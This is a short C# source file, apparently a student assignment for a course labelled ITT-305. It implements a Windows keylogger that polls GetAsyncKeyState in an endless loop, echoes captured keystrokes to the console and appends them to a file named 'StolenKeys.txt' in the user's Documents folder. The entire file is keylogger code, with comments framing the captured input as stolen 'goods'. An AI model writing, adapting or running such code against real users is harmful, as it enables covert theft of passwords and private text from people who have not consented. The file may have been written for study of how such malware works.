// Ryan Scott
// ITT-305

using System.Runtime.InteropServices;
class Program
{
    // Importing a native Windows file
    [DllImport("User32.dll")]
    public static extern int GetAsyncKeyState(Int32 i);


    static void Main(string[] args)
    {
        // Set up Keylogging directory
        String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        
        // Create Directory if one does not exist
        if(!Directory.Exists(filepath))
            Directory.CreateDirectory(filepath);

        // Text file where we store the goods
        string path = (filepath + @"\StolenKeys.txt");

        // Captures keystrokes and display them to the console
        // Will also output to a text file "StolenKeys.txt"
        while (true)
        {
            Thread.Sleep(5);
            for (int i = 32; i < 127; i++)
            {
                int keyState = GetAsyncKeyState(i);
                if (keyState == 32769)
                {
                    Console.Write((char)i + ", ");
                    // Keylog if file path exists
                    if (File.Exists(path))
                        using (StreamWriter sw = File.AppendText(path))
                            sw.Write((char)i);
                }
            }
        }
    }
}